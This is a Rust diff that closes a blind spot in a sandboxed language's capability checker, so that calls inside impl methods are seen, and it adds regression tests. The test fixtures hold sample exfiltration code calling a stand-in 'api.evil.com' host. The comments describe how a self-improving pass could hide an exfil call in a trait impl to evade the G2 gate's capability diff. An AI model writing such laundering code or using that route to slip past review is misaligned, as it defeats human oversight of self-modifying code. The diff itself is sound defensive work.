@@ -131,8 +131,19 @@ pub fn check_capabilities(program: &Program) -> Vec<CapabilityError> {
         })
         .collect();
     for item in &program.items {
-        if let Item::FnDef(fndef) = item {
-            check_fn(fndef, &fn_map, &mut errors);
+        match item {
+            Item::FnDef(fndef) => check_fn(fndef, &fn_map, &mut errors),
+            // An impl method with its OWN @[contained] must be enforced too —
+            // otherwise `impl T for X { @[contained(net:[])] fn m(self){ http_get(..) } }`
+            // would silently escape its declared sandbox (the method's body was
+            // never checked against its spec). Methods without @[contained] are
+            // no-ops in check_fn, matching free-fn behavior.
+            Item::ImplBlock(b) => {
+                for m in &b.methods {
+                    check_fn(m, &fn_map, &mut errors);
+                }
+            }
+            _ => {}
         }
     }
     errors
@@ -177,8 +188,20 @@ struct CapCtx<'a, 'e> {
 pub fn program_capabilities(program: &Program) -> std::collections::BTreeSet<String> {
     let mut caps = std::collections::BTreeSet::new();
     for item in &program.items {
-        if let Item::FnDef(f) = item {
-            collect_caps_expr(&f.body, &mut caps);
+        match item {
+            Item::FnDef(f) => collect_caps_expr(&f.body, &mut caps),
+            // Impl-method bodies are full FnDefs and CAN exercise capabilities —
+            // an exfil call inside `impl Trait for T { fn m(self) { http_get(..) } }`
+            // was previously invisible to G2's capability-diff (I-12) and the
+            // import-edge demand set (I-11, E1203), a real laundering vector.
+            Item::ImplBlock(b) => {
+                for m in &b.methods {
+                    collect_caps_expr(&m.body, &mut caps);
+                }
+            }
+            // Module-level `let NAME = comptime { … }` initializers run code too.
+            Item::LetDef { value, .. } => collect_caps_expr(value, &mut caps),
+            _ => {}
         }
     }
     caps
@@ -205,23 +228,39 @@ pub fn capability_of_builtin(name: &str) -> Option<&'static str> {
 fn importer_grant_ceiling(importer: &Program) -> Option<std::collections::BTreeSet<String>> {
     let mut ceiling = std::collections::BTreeSet::new();
     let mut declared = false;
+    // Closure so a contained spec on either a free fn OR an impl method raises
+    // the ceiling consistently (an impl method may legitimately declare its own
+    // grant; counting it keeps the import-edge demand/grant sides symmetric).
+    let mut absorb = |spec: &ContainedSpec| {
+        declared = true;
+        if !spec.fs_read.is_empty() {
+            ceiling.insert("fs:read".to_string());
+        }
+        if !spec.fs_write.is_empty() {
+            ceiling.insert("fs:write".to_string());
+        }
+        if !spec.net_allow.is_empty() {
+            ceiling.insert("net".to_string());
+        }
+        if spec.exec_allowed {
+            ceiling.insert("exec".to_string());
+        }
+    };
     for item in &importer.items {
-        if let Item::FnDef(f) = item {
-            if let Some(spec) = &f.contained {
-                declared = true;
-                if !spec.fs_read.is_empty() {
-                    ceiling.insert("fs:read".to_string());
-                }
-                if !spec.fs_write.is_empty() {
-                    ceiling.insert("fs:write".to_string());
-                }
-                if !spec.net_allow.is_empty() {
-                    ceiling.insert("net".to_string());
-                }
-                if spec.exec_allowed {
-                    ceiling.insert("exec".to_string());
+        match item {
+            Item::FnDef(f) => {
+                if let Some(spec) = &f.contained {
+                    absorb(spec);
                 }
             }
+            Item::ImplBlock(b) => {
+                for m in &b.methods {
+                    if let Some(spec) = &m.contained {
+                        absorb(spec);
+                    }
+                }
+            }
+            _ => {}
         }
     }
     if declared {
@@ -962,6 +1001,77 @@ mod tests {
         );
         let errs = check_import_capabilities(&importer, "evil::hidden", &imported);
         assert_eq!(errs.len(), 1, "net hidden in a with-block must still widen: {errs:?}");
+        assert_eq!(errs[0].code, E1203);
+        assert!(errs[0].message.contains("net"), "must name the laundered net cap: {}", errs[0].message);
+    }
+
+    #[test]
+    fn program_capabilities_sees_impl_method_bodies() {
+        // BLIND-SPOT GUARD: program_capabilities (the surface R10's G2 self-
+        // improvement gate diffs, AND the import-edge E1203 demand set) walked
+        // ONLY Item::FnDef — so a capability call inside an `impl` method body
+        // was INVISIBLE. A self-improving pass could move/introduce an exfil call
+        // into a trait impl and G2 would see no capability widening; an imported
+        // module could launder net/fs/exec past the importer's ceiling through an
+        // impl method. This proves the walk now descends into ImplBlock methods.
+        let p = parse(
+            "type Sender = { id: i64 }\n\
+             trait Exfil { fn leak(self) -> str }\n\
+             impl Exfil for Sender {\n\
+               fn leak(self: Sender) -> str {\n\
+                 match http_get(\"api.evil.com\") { Ok(s) => s  Err(_) => \"\" }\n\
+               }\n\
+             }\n\
+             fn main() -> i64 { 0 }",
+        );
+        let caps = program_capabilities(&p);
+        assert!(caps.contains("net"),
+            "net call inside an impl method must be visible to G2/import-edge, got: {caps:?}");
+    }
+
+    #[test]
+    #[ignore = "parser gap, not a checker gap: parse_fn hardcodes contained: None and the \
+                @[contained] spec-extraction only runs in the top-level item parser, so an impl \
+                method never carries a spec. check_capabilities now WALKS impl methods (the fix here), \
+                so this passes the moment parse_impl_block extracts contained specs. The G2 + \
+                import-edge surfaces (which key on call NAME, not a declared spec) ARE fixed and \
+                proven by the two tests above. Un-ignore when the parser is extended."]
+    fn impl_method_with_own_contained_is_enforced() {
+        // The self-check (E1001) surface must enforce a @[contained] declared ON
+        // an impl method — check_capabilities now walks Item::ImplBlock methods,
+        // but the PARSER does not yet populate `m.contained` for them (documented
+        // gap above), so this is currently unreachable end-to-end.
+        let p = parse(
+            "type T = { x: i64 }\n\
+             trait N { fn go(self) -> str }\n\
+             impl N for T {\n\
+               @[contained(net: [], exec: none)]\n\
+               fn go(self: T) -> str { ai_complete(\"exfil\") }\n\
+             }",
+        );
+        let errs = check_capabilities(&p);
+        assert!(errs.iter().any(|e| e.code == E1001),
+            "contained impl method must be enforced (E1001): {errs:?}");
+    }
+
+    #[test]
+    fn impl_method_cannot_launder_capability_past_import_ceiling() {
+        // The end-to-end consequence: an importer contained to fs-read only must
+        // still reject an imported module that hits the network FROM AN IMPL
+        // METHOD (the laundering vector the blind spot opened).
+        let importer = parse(
+            "@[contained(fs: [read(\"./data/\")], exec: none)]\n\
+             fn main() -> i64 { 0 }",
+        );
+        let imported = parse(
+            "type T = { x: i64 }\n\
+             trait Net { fn go(self) -> str }\n\
+             impl Net for T {\n\
+               fn go(self: T) -> str { match http_get(\"api.evil.com\") { Ok(s) => s  Err(_) => \"\" } }\n\
+             }",
+        );
+        let errs = check_import_capabilities(&importer, "evil::impl", &imported);
+        assert_eq!(errs.len(), 1, "net hidden in an impl method must widen: {errs:?}");
         assert_eq!(errs[0].code, E1203);
         assert!(errs[0].message.contains("net"), "must name the laundered net cap: {}", errs[0].message);
     }
